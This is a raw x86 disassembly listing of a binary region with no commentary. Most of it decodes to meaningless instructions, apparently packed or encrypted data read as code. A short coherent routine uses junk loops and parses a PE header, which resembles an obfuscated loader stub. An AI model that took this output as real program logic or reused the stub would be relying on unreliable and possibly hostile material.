  41004a:	sbb    eax,0xed755fb4
  41004f:	(bad)  
  410050:	test   al,0xa9
  410052:	mov    cl,0x62
  410054:	ret    0x1c0f
  410057:	call   0xd856369e
  41005c:	fdivr  QWORD PTR [esi+0x3de7d1d8]
  410062:	push   eax
  410063:	lahf   
  410064:	or     dl,dh
  410066:	icebp  
  410067:	ret    
  410068:	push   edx
  410069:	xchg   WORD PTR [ebx-0x7],sp
  41006d:	push   esp
  41006e:	iret   
  41006f:	mov    dl,0x8a
  410071:	jb     0x4100b2
  410073:	ja     0x410084
  410075:	cmc    
  410076:	mov    ch,0x3d
  410078:	adc    al,dl
  41007a:	sbb    BYTE PTR [ebp-0xe],0x99
  41007e:	jne    0x410084
  410080:	sub    dh,BYTE PTR [edx+esi*1+0x62]
  410084:	(bad)  
  410085:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410086:	pushf  
  410087:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410088:	inc    edi
  410089:	push   edx
  41008a:	vhaddpd ymm2,ymm2,YMMWORD PTR [edx-0x5a]
  41008f:	mov    DWORD PTR [ebx-0x5a92b61b],ebx
  410095:	add    edi,0x6ece54f8
  41009b:	push   edx
  41009c:	sbb    DWORD PTR [edx+0x13d0baee],ebp
  4100a2:	lock enter 0xf14f,0xbd
  4100a7:	in     eax,dx
  4100a8:	stos   BYTE PTR es:[edi],al
  4100a9:	repnz repnz pop ecx
  4100ac:	pop    ecx
  4100ad:	scas   eax,DWORD PTR es:[edi]
  4100ae:	fild   WORD PTR [eax]
  4100b0:	sbb    BYTE PTR [ebp-0x4a847796],dh
  4100b6:	(bad)  
  4100b8:	retf   
  4100b9:	cwde   
  4100ba:	cs inc eax
  4100bc:	inc    eax
  4100bd:	jmp    0xfebcf4bc
  4100c2:	mov    ah,BYTE PTR [ecx+0x490a552c]
  4100c8:	aaa    
  4100c9:	dec    edx
  4100ca:	and    al,0x5b
  4100cc:	ret    
  4100cd:	hlt    
  4100ce:	adc    DWORD PTR [ebx+0x3eb2ad4d],0x68
  4100d5:	loope  0x41008c
  4100d7:	int    0x2d
  4100d9:	mov    eax,ds:0x48575852
  4100de:	add    BYTE PTR [ebp-0x1c51b373],dh
  4100e4:	pop    esi
  4100e5:	lock jp 0x4100bb
  4100e8:	xor    esi,DWORD PTR ds:0xbe9ef44
  4100ee:	rol    BYTE PTR [edx],cl
  4100f0:	and    al,0x86
  4100f2:	fimul  WORD PTR [esi+edx*2+0x935c42c]
  4100f9:	aaa    
  4100fa:	leave  
  4100fb:	pop    ss
  4100fc:	adc    BYTE PTR [ebp+0x403073dc],bh
  410102:	pusha  
  410103:	fmul   QWORD PTR [edx+ecx*4]
  410106:	add    al,0x9f
  410108:	stc    
  410109:	inc    edx
  41010a:	and    BYTE PTR [edx],dl
  41010c:	sbb    cl,cl
  41010e:	jecxz  0x41016a
  410110:	push   0xf80450b0
  410115:	gs mov ecx,0x7de651e1
  41011b:	inc    ebx
  41011c:	(bad)  
  41011d:	test   al,0x8b
  41011f:	inc    ebp
  410120:	cld    
  410121:	xor    eax,edi
  410123:	pop    edi
  410124:	jmp    0x4104b7
  410129:	push   ecx
  41012a:	clc    
  41012b:	clc    
  41012c:	mov    ebx,0x9c5dbb51
  410131:	test   BYTE PTR [edi-0x56],dh
  410134:	adc    edx,ebx
  410136:	push   ebp
  410137:	or     BYTE PTR ds:0x7e7e4478,cl
  41013d:	hlt    
  41013e:	jns    0x4101be
  410140:	jle    0x4101a6
  410142:	xor    eax,0xc552b554
  410147:	dec    ebx
  410148:	push   edx
  410149:	mov    ebp,0x8369871e
  41014e:	test   eax,0x1c3311fa
  410153:	je     0x41014c
  410155:	hlt    
  410156:	dec    edx
  410157:	rcl    DWORD PTR [eax+edi*1],cl
  41015a:	xor    DWORD PTR [esi-0x4f10be53],edi
  410160:	sub    ebp,DWORD PTR [ebx]
  410162:	or     ah,BYTE PTR [ecx-0x4e]
  410165:	(bad)  
  410166:	jle    0x410154
  410168:	mov    bl,0xfa
  41016a:	or     ebp,DWORD PTR [edx-0x316807bc]
  410170:	out    0x95,eax
  410172:	outs   dx,DWORD PTR ds:[esi]
  410173:	add    dh,BYTE PTR [esi+0x4cf18a2a]
  410179:	ins    BYTE PTR es:[edi],dx
  41017a:	push   esp
  41017b:	pop    edx
  41017c:	stos   DWORD PTR es:[edi],eax
  41017d:	scas   eax,DWORD PTR es:[edi]
  41017e:	fs es jno 0x410105
  410182:	sub    ch,al
  410184:	fistp  QWORD PTR [eax]
  410186:	das    
  410187:	lds    ebp,FWORD PTR [ebx+0x32]
  41018a:	int    0x5e
  41018c:	jae    0x410157
  41018e:	popa   
  41018f:	push   edi
  410190:	sub    eax,0xb8effa0b
  410195:	aam    0x1d
  410197:	in     eax,0x16
  410199:	sar    DWORD PTR [esi],cl
  41019b:	pop    ds
  41019c:	push   ebx
  41019d:	nop
  41019e:	push   cs
  41019f:	pop    edi
  4101a0:	jns    0x410174
  4101a2:	push   0xffffffe2
  4101a4:	push   eax
  4101a5:	mov    eax,ds:0xd4897147
  4101aa:	fucom  st(2)
  4101ac:	test   BYTE PTR [ebp-0x68e8b8c2],bl
  4101b2:	sub    ah,ch
  4101b4:	cmp    BYTE PTR [ebp+edi*8+0x4],ah
  4101b8:	cld    
  4101b9:	adc    ebx,DWORD PTR [ebp-0x52b56f2e]
  4101bf:	mov    dh,ch
  4101c1:	push   0xc902df5f
  4101c6:	add    DWORD PTR [ecx],0xffffff83
  4101c9:	xchg   edi,eax
  4101ca:	lods   al,BYTE PTR ds:[esi]
  4101cb:	imul   esp,DWORD PTR [esi+ecx*4-0x1],0x17
  4101d0:	sbb    BYTE PTR [esi+eax*2-0x2],0x7d
  4101d5:	stos   BYTE PTR es:[edi],al
  4101d6:	mov    bl,0xa0
  4101d8:	adc    BYTE PTR [edx-0x10667272],bl
  4101de:	adc    al,0xc9
  4101e0:	mov    ch,0x3e
  4101e2:	jle    0x41017c
  4101e4:	cmp    DWORD PTR [ebx],ebx
  4101e6:	add    eax,0xc31a9f65
  4101eb:	mov    eax,ds:0x43c3c76c
  4101f0:	cmp    eax,0x1526b78e
  4101f5:	clc    
  4101f6:	add    esi,DWORD PTR [ecx-0x27]
  4101f9:	sbb    ah,bh
  4101fb:	pop    edi
  4101fc:	loopne 0x410181
  4101fe:	sbb    dl,BYTE PTR [ebx]
  410200:	dec    esp
  410201:	add    ebx,DWORD PTR [edx-0x210c4122]
  410207:	sub    BYTE PTR [eax],dl
  410209:	inc    edi
  41020a:	btc    DWORD PTR [ecx],eax
  41020d:	inc    ebp
  41020e:	jbe    0x4101a2
  410210:	stos   BYTE PTR es:[edi],al
  410211:	xlat   BYTE PTR ds:[ebx]
  410212:	or     edi,DWORD PTR [ecx+edx*8+0x2a5d8b9e]
  410219:	(bad)  
  41021a:	adc    esi,esp
  41021c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41021d:	repnz in eax,0x3d
  410220:	arpl   cx,bp
  410222:	mov    esp,0x2bf9bf07
  410227:	mov    ah,0x2a
  410229:	pop    ebx
  41022a:	push   cs
  41022b:	and    ecx,ebp
  41022d:	inc    esp
  41022e:	leave  
  41022f:	xchg   esp,eax
  410230:	iret   
  410231:	mov    bh,0x8c
  410233:	retf   
  410234:	or     bh,dl
  410236:	sar    DWORD PTR [edx+eax*1],0xfc
  41023a:	jecxz  0x410239
  41023c:	mov    edx,DWORD PTR [ebx-0x53]
  41023f:	cld    
  410240:	push   DWORD PTR [edx+ebx*8-0x62]
  410244:	test   BYTE PTR [edi+ebp*1],bl
  410247:	rcr    esi,1
  410249:	inc    ecx
  41024a:	or     ebp,edi
  41024c:	mov    eax,ds:0x493b685e
  410251:	sub    esp,DWORD PTR [ecx+0x3d964328]
  410257:	dec    edi
  410258:	mov    al,ds:0x1178f9c9
  41025d:	xor    eax,0x58b5d528
  410262:	mov    eax,ds:0xa74ca07
  410267:	push   edi
  410268:	cmp    al,0xe6
  41026a:	(bad)  
  41026b:	adc    BYTE PTR [edx],dl
  41026d:	mov    dh,0x46
  41026f:	cmp    eax,0xdeeaf741
  410274:	xchg   DWORD PTR [ecx],ebx
  410276:	repnz push cs
  410278:	pop    edx
  410279:	xor    DWORD PTR [esi],edi
  41027b:	dec    edx
  41027c:	aas    
  41027d:	fidiv  DWORD PTR [ecx-0x20]
  410280:	or     BYTE PTR [edi+0xd20677d],ah
  410286:	cld    
  410287:	xchg   esi,eax
  410288:	shl    ch,cl
  41028a:	jle    0x410290
  41028c:	fild   QWORD PTR [eax+0x1]
  41028f:	ds mov ecx,0x598dd711
  410295:	punpckhwd mm2,mm0
  410298:	xchg   BYTE PTR ds:0xf4069b5a,dl
  41029e:	fbld   TBYTE PTR [edi-0x2c]
  4102a1:	mov    ds:0x4652ff12,al
  4102a6:	and    al,0x5b
  4102a8:	lods   al,BYTE PTR ds:[esi]
  4102a9:	push   cs
  4102aa:	adc    edi,DWORD PTR [eax+eax*1-0x5194e8ee]
  4102b1:	mov    eax,0xfb17318f
  4102b6:	xor    eax,0x3fb05478
  4102bb:	adc    bh,BYTE PTR [ebx-0x57]
  4102be:	out    dx,eax
  4102bf:	cmp    ebx,DWORD PTR [edi]
  4102c1:	jecxz  0x41030f
  4102c3:	out    0x44,eax
  4102c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102c6:	mov    ds:0xcd7a37eb,eax
  4102cb:	mov    DWORD PTR [ebx-0x4f],esi
  4102ce:	mov    BYTE PTR [eax],cl
  4102d0:	popa   
  4102d1:	or     edx,DWORD PTR [eax+0x6a8c8350]
  4102d7:	lds    eax,FWORD PTR [edi+0x3d012f32]
  4102dd:	sbb    bh,BYTE PTR [ecx]
  4102df:	sbb    BYTE PTR [eax],0x24
  4102e2:	inc    esi
  4102e3:	stos   BYTE PTR es:[edi],al
  4102e4:	loopne 0x410363
  4102e6:	xor    eax,0x65d896d9
  4102eb:	data16 jp 0x410287
  4102ee:	call   0x8a856bd7
  4102f3:	or     DWORD PTR [esi-0x3e],edx
  4102f6:	lods   al,BYTE PTR fs:[esi]
  4102f8:	(bad)  [esi]
  4102fa:	in     al,dx
  4102fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4102fc:	call   0xf3a4863
  410301:	adc    esp,DWORD PTR [edi-0x35fcc6c9]
  410307:	iret   
  410308:	leave  
  410309:	repz mov edx,0xce82dd94
  41030f:	mov    DWORD PTR [eax],ebp
  410311:	cwde   
  410312:	hlt    
  410313:	lahf   
  410314:	hlt    
  410315:	push   0x5ed858e1
  41031a:	not    DWORD PTR [edi-0x4a]
  41031d:	imul   ebp,DWORD PTR [ebp+0x495cfdd],0xffffffd7
  410324:	test   BYTE PTR [ebx],0xeb
  410327:	ret    0x9022
  41032a:	mov    cl,0x6
  41032c:	sar    BYTE PTR [edi+ecx*8+0x8f0215],0xc2
  410334:	popf   
  410335:	data16 lahf 
  410337:	ds sahf 
  410339:	dec    edx
  41033a:	fstp   TBYTE PTR es:[ebx+0x34]
  41033e:	and    cl,BYTE PTR [ecx+0x21]
  410341:	cdq    
  410342:	xchg   esi,eax
  410343:	cdq    
  410344:	cmp    edi,DWORD PTR [edi+0x55af6b55]
  41034a:	pop    ecx
  41034b:	pop    edi
  41034c:	xor    edi,DWORD PTR [ebx]
  41034e:	leave  
  41034f:	lods   eax,DWORD PTR ds:[esi]
  410350:	jae    0x410325
  410352:	cmp    DWORD PTR [ecx+0x5cf368f6],edi
  410358:	cmp    eax,0x20441688
  41035d:	xor    eax,DWORD PTR [ecx]
  41035f:	mov    bl,0x54
  410361:	push   ebp
  410362:	sub    esp,ebx
  410364:	lea    ebp,[edi+0x39]
  410367:	pushf  
  410368:	dec    sp
  41036a:	mov    BYTE PTR [edx],ch
  41036c:	xchg   edi,eax
  41036d:	mov    ds:0x5384ae1b,al
  410372:	loope  0x4103d5
  410374:	adc    bh,BYTE PTR [edi+0x1f]
  410377:	mov    esi,0x17e4221f
  41037c:	(bad)  
  41037d:	mov    esi,DWORD PTR [eax+0x19]
  410380:	xchg   edx,eax
  410381:	and    ah,BYTE PTR [ebp-0x2e]
  410384:	jecxz  0x41030a
  410386:	lock inc ebp
  410388:	fdivr  st,st(3)
  41038a:	xor    DWORD PTR [esi],0x7
  41038d:	outs   dx,BYTE PTR ds:[esi]
  41038e:	stc    
  41038f:	repnz in al,0x47
  410392:	sub    esp,0x44
  410395:	sub    DWORD PTR [edx-0x20b3773c],edi
  41039b:	iret   
  41039c:	fcom   DWORD PTR [esp+ebp*2+0x3d16c2cc]
  4103a3:	dec    ebx
  4103a4:	pushf  
  4103a5:	pop    ss
  4103a6:	inc    esi
  4103a7:	xor    DWORD PTR [ecx+0x6edf33d0],esi
  4103ad:	mov    al,ds:0x6bdf6716
  4103b2:	(bad)  
  4103b3:	in     eax,dx
  4103b4:	add    ah,cl
  4103b6:	xor    ecx,DWORD PTR [eax+0x40]
  4103b9:	or     edi,esi
  4103bb:	sub    esi,DWORD PTR [ebp+0x3]
  4103be:	sub    dl,al
  4103c0:	out    dx,eax
  4103c1:	jne    0x4103c0
  4103c3:	ret    
  4103c4:	test   bl,dh
  4103c6:	xchg   ebx,eax
  4103c7:	inc    esi
  4103c8:	xor    eax,0x44f3a91f
  4103cd:	aas    
  4103ce:	pop    eax
  4103cf:	adc    DWORD PTR [edi-0x7c],ecx
  4103d2:	and    DWORD PTR [esi-0x32],eax
  4103d5:	fwait
  4103d6:	xchg   ebx,eax
  4103d7:	xchg   DWORD PTR [ebx+0x71e76ced],ecx
  4103dd:	ss (bad) 
  4103df:	jecxz  0x41036b
  4103e1:	push   ebp
  4103e2:	cld    
  4103e3:	mov    edi,0x2e5c6f78
  4103e8:	push   ebx
  4103e9:	add    BYTE PTR [ebp-0x68],0xbe
  4103ed:	and    ecx,ecx
  4103ef:	pushf  
  4103f0:	push   edi
  4103f1:	or     eax,0x81af8ce0
  4103f6:	pusha  
  4103f7:	dec    esi
  4103f8:	adc    esp,eax
  4103fa:	mov    dh,BYTE PTR fs:[edi]
  4103fd:	push   es
  4103fe:	push   ss
  4103ff:	int    0x50
  410401:	shl    DWORD PTR [esi+edi*2-0x13],cl
  410405:	cmp    eax,eax
  410407:	call   0xc29257f3
  41040c:	mov    cl,0x81
  41040e:	jo     0x410478
  410410:	jecxz  0x410419
  410412:	cmp    ecx,DWORD PTR [ebp-0x6aaec77e]
  410418:	shl    BYTE PTR ds:0x13796357,0xf8
  41041f:	ret    0xf90e
  410422:	pop    ss
  410423:	neg    BYTE PTR [esi+0x5d]
  410426:	add    DWORD PTR [esi+0xfb77e5f],0xc5d661fe
  410430:	add    dh,BYTE PTR [ebx]
  410432:	jae    0x410405
  410434:	jmp    0xbeae:0x85236272
  41043b:	stos   BYTE PTR es:[edi],al
  41043c:	adc    eax,0x936be151
  410441:	xchg   edx,eax
  410442:	pushf  
  410443:	push   es
  410444:	cmp    al,BYTE PTR [ebx+0x5d]
  410447:	mov    esp,DWORD PTR [ebx]
  410449:	jge    0x4104a7
  41044b:	or     eax,0xa83ee2a1
  410450:	js     0x410457
  410452:	mov    ds:0x20052d0c,eax
  410457:	inc    edi
  410458:	push   cs
  410459:	cmp    DWORD PTR [ebp-0x67bc8495],ecx
  41045f:	jbe    0x41047f
  410461:	in     eax,0xc6
  410463:	jecxz  0x41045c
  410465:	xchg   DWORD PTR [ebp-0x7ced1143],ebp
  41046b:	mov    cl,0xff
  41046d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41046e:	sbb    eax,DWORD PTR [ebp*4-0x427cbb09]
  410475:	scas   al,BYTE PTR es:[edi]
  410476:	push   esi
  410477:	jg     0x410427
  410479:	mov    esi,0x6378e5fc
  41047e:	xor    cl,dh
  410480:	inc    ebp
  410481:	pop    edi
  410482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410483:	sbb    eax,DWORD PTR [ebp+0x69]
  410486:	sbb    BYTE PTR [edi],bh
  410488:	push   edx
  410489:	xchg   esi,eax
  41048a:	sbb    ah,0x96
  41048d:	ficomp WORD PTR [esi]
  41048f:	fcmovbe st,st(0)
  410491:	jae    0x41045e
  410493:	aam    0x89
  410495:	ja     0x4104a2
  410497:	aas    
  410498:	lods   al,BYTE PTR ds:[esi]
  410499:	pop    esp
  41049a:	cwde   
  41049b:	call   0xd1ded183
  4104a0:	cmp    al,0xa8
  4104a2:	sub    esi,ecx
  4104a4:	sub    eax,0x25815876
  4104a9:	out    dx,al
  4104aa:	(bad)  
  4104ab:	jge    0x41048b
  4104ad:	dec    ebx
  4104ae:	rcr    DWORD PTR [edi],cl
  4104b0:	(bad)  
  4104b1:	sbb    ecx,esi
  4104b3:	jp     0x41052f
  4104b5:	xchg   BYTE PTR [ecx],ch
  4104b7:	add    eax,esi
  4104b9:	pop    esi
  4104ba:	leave  
  4104bb:	ret    0xc
  4104be:	push   ebp
  4104bf:	mov    ebp,esp
  4104c1:	push   ecx
  4104c2:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  4104c9:	mov    DWORD PTR ds:0x4344f7,0x1f
  4104d3:	cmp    DWORD PTR ds:0x4344f7,0x0
  4104da:	je     0x410527
  4104e0:	cmp    DWORD PTR ds:0x4344f7,0x10
  4104e7:	jne    0x4104f6
  4104ed:	push   DWORD PTR [ebp-0x28]
  4104f0:	call   DWORD PTR ds:0x41335c
  4104f6:	cmp    DWORD PTR ds:0x4344f7,0x11
  4104fd:	jne    0x41050e
  410503:	mov    eax,ds:0x4344f7
  410508:	dec    eax
  410509:	mov    ds:0x4344f7,eax
  41050e:	xor    eax,eax
  410510:	add    eax,DWORD PTR ds:0x4344f7
  410516:	dec    eax
  410517:	mov    ds:0x4344f7,eax
  41051c:	jmp    0x4104d3
  410521:	xor    DWORD PTR ds:0x434547,ebx
  410527:	mov    eax,DWORD PTR [ebp+0x8]
  41052a:	and    DWORD PTR ds:0x43458f,0x434613
  410534:	mov    al,BYTE PTR [eax]
  410536:	add    al,0x3a
  410538:	xor    al,0x44
  41053a:	cmp    al,0xc3
  41053c:	mov    DWORD PTR ds:0x43454f,0x7f5c
  410546:	jne    0x410979
  41054c:	and    edx,DWORD PTR ds:0x434587
  410552:	mov    eax,DWORD PTR [ebp+0x8]
  410555:	and    DWORD PTR ds:0x4344eb,0x0
  41055f:	jmp    0x410571
  410564:	mov    edx,DWORD PTR ds:0x4344eb
  41056a:	inc    edx
  41056b:	mov    DWORD PTR ds:0x4344eb,edx
  410571:	cmp    DWORD PTR ds:0x4344eb,0x1c
  410578:	jae    0x4105c7
  41057e:	cmp    DWORD PTR ds:0x4344eb,0xc
  410585:	jne    0x4105a6
  41058b:	push   0x1ce2
  410590:	push   DWORD PTR [ebp-0x24]
  410593:	push   0x6804
  410598:	push   DWORD PTR [ebp-0x18]
  41059b:	push   0x869f
  4105a0:	call   DWORD PTR ds:0x4130d4
  4105a6:	cmp    DWORD PTR ds:0x4344eb,0xb
  4105ad:	jne    0x4105c2
  4105b3:	xor    edx,edx
  4105b5:	or     edx,DWORD PTR ds:0x4344eb
  4105bb:	inc    edx
  4105bc:	mov    DWORD PTR ds:0x4344eb,edx
  4105c2:	jmp    0x410564
  4105c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4105ca:	add    ecx,DWORD PTR [eax+0x3c]
  4105cd:	mov    edx,0x7510851
  4105d2:	mov    DWORD PTR [ebp+0x8],ecx
  4105d5:	mov    eax,DWORD PTR [ebp-0x4]
  4105d8:	xor    eax,edx
  4105da:	push   esi
  4105db:	jmp    0x410796
  4105e0:	mov    ebp,0x6da24588
  4105e5:	jae    0x410664
  4105e7:	mov    DWORD PTR [eax],ecx
  4105e9:	sub    esi,DWORD PTR [esi+ecx*2]
  4105ec:	add    al,0xcd
  4105ee:	je     0x410570
  4105f0:	test   BYTE PTR [edi+0x7e],0x7e
  4105f4:	pushf  
  4105f5:	jg     0x410675
  4105f7:	jle    0x410601
  4105f9:	lock mov ecx,DWORD PTR [edx+ecx*2+0x2e]
  4105fe:	and    al,0xf8
  410600:	mov    ah,0x5c
  410602:	sub    BYTE PTR [ebx],ch
  410604:	fnstsw WORD PTR [edx-0x3885dd28]
  41060a:	sbb    DWORD PTR [ecx-0x66],edi
  41060d:	hlt    
  41060e:	sub    al,0xf5
  410610:	dec    edi
  410611:	mov    dl,BYTE PTR [edi+0x1e]
  410614:	cmp    dh,ah
  410616:	push   ebx
  410617:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410618:	arpl   WORD PTR [eax+0x5],bx
  41061b:	aaa    
  41061c:	call   0x852f:0xd90c0ae2
  410623:	inc    ebp
  410624:	rcr    BYTE PTR [edi+0x3a],cl
  410627:	sbb    eax,0x4b8eaa80
  41062c:	call   0x5a0a:0x6d5cf2b0
  410633:	out    0xf3,eax
  410635:	jecxz  0x41061b
  410637:	rol    DWORD PTR [edi+eax*2+0x1f],0xa3
  41063c:	scas   eax,DWORD PTR es:[edi]
  41063d:	push   ebx
  41063e:	dec    ebx
  41063f:	repz sbb BYTE PTR [edi-0x7de8fc4f],bl
  410646:	mov    ebx,0x95f93a95
  41064b:	in     al,0x32
  41064d:	dec    edi
  41064e:	shl    BYTE PTR [ebx-0x56523639],0xe9
  410655:	dec    ecx
  410656:	sbb    al,0xc7
  410658:	imul   edi,esi,0xea4ab38f
  41065e:	call   0xdd363132
  410663:	cmp    dh,BYTE PTR [ecx-0x2692c2d0]
  410669:	in     al,0xca
  41066b:	pop    ecx
  41066c:	adc    al,0x28
  41066e:	popf   
  41066f:	addr16 mov eax,0xa371a19e
  410675:	push   cs
  410676:	xor    eax,0xd9a87437
  41067b:	push   ds
  41067c:	mov    esp,0x59da1679
  410681:	mov    cl,0x38
  410683:	sbb    al,BYTE PTR [eax+0x4d7ec888]
  410689:	mov    bh,0xb2
  41068b:	data16 fisubr WORD PTR ds:[edi]
  41068f:	sar    ecx,cl
  410691:	sbb    eax,eax
  410693:	inc    esi
  410694:	dec    edx
  410695:	sub    BYTE PTR [ebx-0x6a],al
  410698:	mov    ds:0xc3ff7f9,al
  41069d:	and    al,0x45
  41069f:	push   0x56
  4106a1:	sub    al,0x26
  4106a3:	add    DWORD PTR [ecx+0x36],eax
  4106a6:	xchg   ebp,eax
  4106a7:	stos   DWORD PTR es:[edi],eax
  4106a8:	call   0x24ad8f6b
  4106ad:	xchg   bx,ax
  4106af:	fidiv  WORD PTR [ebx+0x63]
  4106b2:	outs   dx,DWORD PTR ds:[esi]
  4106b3:	sub    al,0x93
  4106b5:	ins    BYTE PTR es:[edi],dx
  4106b6:	mov    edi,0x68009cdd
  4106bb:	add    ebp,DWORD PTR [eax+0x6e]
  4106be:	jns    0x4106d4
  4106c0:	push   edi
  4106c1:	mov    edi,0x3de35f3d
  4106c6:	shr    DWORD PTR [esi+ecx*2],cl
  4106c9:	add    BYTE PTR [ebp+0x1c27cb7],al
  4106cf:	push   eax
  4106d0:	inc    ecx
  4106d1:	(bad)  
  4106d2:	jnp    0x4106f9
  4106d4:	push   ebp
  4106d5:	jle    0x410722
  4106d7:	stc    
  4106d8:	scas   al,BYTE PTR es:[edi]
  4106d9:	test   DWORD PTR [ecx+0x7e8e8d29],eax
  4106df:	or     cl,cl
  4106e1:	add    esp,DWORD PTR [ecx-0x17356bd9]
  4106e7:	outs   dx,DWORD PTR ds:[esi]
  4106e8:	pop    ebx
  4106e9:	inc    eax
  4106ea:	push   esi
  4106eb:	rcr    BYTE PTR [ecx],1
  4106ed:	cmp    DWORD PTR [edi],esp
  4106ef:	mov    edx,0x5f50a367
  4106f4:	int    0x32
  4106f6:	je     0x4106a9
  4106f8:	std    
  4106f9:	inc    eax
  4106fa:	mov    edi,ecx
  4106fc:	je     0x4106fd
  4106fe:	sbb    al,0x34
  410700:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410701:	xor    al,0xed
  410703:	(bad)  
  410704:	sub    dl,dh
  410706:	and    al,0x22
  410708:	lods   al,BYTE PTR ds:[esi]
  410709:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41070b:	(bad)  
  41070c:	push   eax
  41070d:	outs   dx,BYTE PTR ds:[esi]
  41070e:	or     BYTE PTR [esi+edi*8-0x48f1d5cf],ah
  410715:	mov    edi,0x59fe97cb
  41071a:	cs popf 
  41071c:	dec    ebp
  41071d:	xchg   BYTE PTR [ebx],al
  41071f:	mov    esi,0x576d7a16
  410724:	cdq    
  410725:	retf   
  410726:	add    ebx,DWORD PTR [edi-0x5c0fcc84]
  41072c:	push   esp
  41072d:	xor    eax,DWORD PTR [ecx+0x170ba39]
  410733:	shl    BYTE PTR [ebp-0x3b],0xa2
  410737:	bound  edi,QWORD PTR [ebx+eax*4+0x5d]
  41073b:	sub    eax,0xb3dfeefa
  410740:	jmp    0xf09c1364
  410745:	in     eax,0x72
  410747:	xor    DWORD PTR [ebx+0x373eb7f1],esp
  41074d:	push   0xffffffa8
  41074f:	jns    0x4107c6
  410751:	mov    ecx,0x7479d68f
  410756:	jecxz  0x4107b2
  410758:	mov    ds:0xa4920860,al
  41075d:	push   esp
  41075e:	and    ch,dh
  410760:	cmp    eax,0xc9b6948
  410765:	add    BYTE PTR [ebx],al
  410767:	scas   al,BYTE PTR es:[edi]
  410768:	mov    ch,0x66
  41076a:	int    0xbc
  41076c:	aaa    
  41076d:	in     al,0xa8
  41076f:	xor    eax,0xb091059b
  410774:	mov    cl,0xd5
  410776:	rcl    DWORD PTR [esi+ebp*8+0x68],1
  41077a:	inc    esp
  41077b:	gs xor ebx,esp
  41077e:	sub    dh,BYTE PTR [eax+0x4f]
  410781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410782:	imul   esi,DWORD PTR [ecx-0x960ea1f],0x364e8d4f
  41078c:	enter  0x4b2d,0x99
  410790:	cld    
  410791:	jmp    0x89e12335
  410796:	mov    esi,DWORD PTR [ebp+0x8]
  410799:	mov    ecx,0x327299
  41079e:	jmp    0x410959
  4107a3:	cmc    
  4107a4:	mov    al,BYTE PTR [esi+ecx*8+0x65]
  4107a8:	enter  0xb575,0x7e
  4107ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107ad:	mov    dl,0x1f
  4107af:	(bad)
  4107b2:	int    0x14
  4107b4:	inc    ecx
  4107b5:	jle    0x410835
  4107b7:	pushf  
  4107b8:	jg     0x410838
  4107ba:	jle    0x410779
  4107bc:	push   eax
  4107bd:	je     0x4107f0
  4107bf:	inc    ecx
  4107c0:	mov    al,BYTE PTR [eax-0xfd08f2e]
  4107c6:	imul   esp,DWORD PTR [ebp+0x236a1909],0xffffff9c
  4107cd:	mov    dl,bl
  4107cf:	inc    eax
  4107d0:	popa   
  4107d1:	or     DWORD PTR [ebx],0xdbb0e3c6
  4107d7:	adc    ebx,DWORD PTR [eax+0x60]
  4107da:	mov    ah,BYTE PTR ds:0x4c3872a9
  4107e0:	fdivrp st(4),st
  4107e2:	or     DWORD PTR [edi],edx
  4107e4:	inc    edi
  4107e5:	sahf   
  4107e6:	cmp    ch,BYTE PTR [esi+0x4]
  4107e9:	jnp    0x410840
  4107eb:	cs (bad) 
  4107ed:	jmp    0xc1a7839f
  4107f2:	adc    ebx,ebp
  4107f4:	fwait
  4107f5:	call   0xfde720d7
  4107fa:	push   cs
  4107fb:	xchg   ecx,eax
  4107fc:	arpl   WORD PTR [edx+0x36],si
  4107ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410800:	daa    
  410801:	scas   al,BYTE PTR es:[edi]
  410802:	pop    ecx
  410803:	or     edx,esp
  410805:	jge    0x4107a1
  410807:	cmp    eax,0x547398f6
  41080c:	jbe    0x410795
  41080e:	cmc    
  41080f:	iret   
  410810:	lods   al,BYTE PTR ds:[esi]
  410811:	popa   
  410812:	push   ebx
  410813:	pop    edx
  410814:	xor    al,0x94
  410816:	dec    DWORD PTR [ebp-0x41]
  410819:	pop    gs
  41081b:	adc    edi,DWORD PTR [ebx+0x63ea0c47]
  410821:	jmp    0x410877
  410823:	cmp    DWORD PTR [ebx+0x6b98ca3d],ebp
  410829:	mov    edx,0xcda36436
  41082e:	aad    0x7c
  410830:	sub    eax,0x8a7ca2bc
  410835:	aam    0x39
  410837:	add    eax,0x46aec626
  41083c:	lods   al,BYTE PTR ds:[esi]
  41083d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41083e:	cmp    BYTE PTR [edi+esi*8],al
  410841:	jns    0x41089a
  410843:	ja     0x410888
  410845:	fnsave [edx+eax*1]
  410848:	adc    eax,0x9c9164d
  41084d:	jae    0x410844
  41084f:	add    eax,0x7d9d76bb
  410854:	mov    al,ds:0xf0c3b6b0
  410859:	cmp    eax,0x77170906
  41085e:	sbb    eax,0x29a0a5de
  410863:	fucomi st,st(6)
  410865:	dec    edx
  410866:	(bad)  
  410867:	popf   
  410868:	jle    0x410858
  41086a:	sub    al,0x69
  41086c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41086d:	aaa    
  41086e:	xchg   BYTE PTR [edi],bh
  410870:	sub    DWORD PTR [edx+0x74866350],eax
  410876:	sbb    esi,DWORD PTR [esp+ecx*4]
  410879:	hlt    
  41087a:	outs   dx,DWORD PTR ds:[esi]
  41087b:	sbb    BYTE PTR [esi-0x2ab10740],ch
  410881:	or     al,0x70
  410883:	cmp    edx,DWORD PTR [edx+0x61]
  410886:	rol    DWORD PTR [edx],cl
  410888:	call   0xfbe1f0c9
  41088d:	js     0x410829
  41088f:	cli    
  410890:	sbb    DWORD PTR [eax],ebx
  410892:	inc    edx
  410893:	sbb    DWORD PTR [esi],esp
  410895:	xchg   ebp,eax
  410896:	pushf  
